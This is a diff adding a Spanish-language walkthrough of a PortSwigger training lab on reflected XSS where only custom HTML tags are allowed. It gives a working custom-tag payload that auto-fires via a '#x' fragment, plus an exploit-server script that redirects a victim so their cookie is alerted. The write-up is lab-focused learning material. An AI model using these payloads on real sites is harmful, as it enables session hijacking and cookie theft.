@@ -240,6 +240,44 @@ Y luego de ello vamos al home del laboratorio para ver que lo completamos.
 
 ## 7. Lab: Reflected XSS into HTML context with all tags blocked except custom ones
 
+```
+This lab blocks all HTML tags except custom ones.
+
+To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.
+```
+
+Entonces buscamos un payload custom, y obtenemos el siguiente:
+
+```
+<xss id=x tabindex=1 onfocus=alert(1)>
+```
+
+Pero si lo colocamos en el navegador, este no genera ningun mensaje de alert, así que lo lo que haremos será llamar a la etiqueta que escribimos, y esto podemos hacer haciendo referencia al id de la etiqueta el cual es **x**, entonces en la url al final agregamos los caracteres **#x** para hacer el llamado a la etiqueta con id **x**, que justamente es nuestor payload.
+
+ ```
+<xss id=x tabindex=1 onfocus=alert(1)>#x
+ ```
+
+![](img25.png)
+
+Entonces ahora vamos a el **exploit server** y escribimos el siguiente payload.
+
+```html
+<script>
+    document.location='https://ace51ff81f542d2f800b9fba009400af.web-security-academy.net/?search=<xss id=x tabindex=1 onfocus=alert(document.cookie)>#x';
+</script>
+```
+
+Entonces Guardamos y enviamos a la victima.
+
+![](img26.png)
+
+Entonces vamos al home del laboratorio para verificar que lo completamos.
+
+![](img27.png)
+
+## 8. Lab: Reflected XSS with event handlers and `href` attributes blocked
+
 
 
 
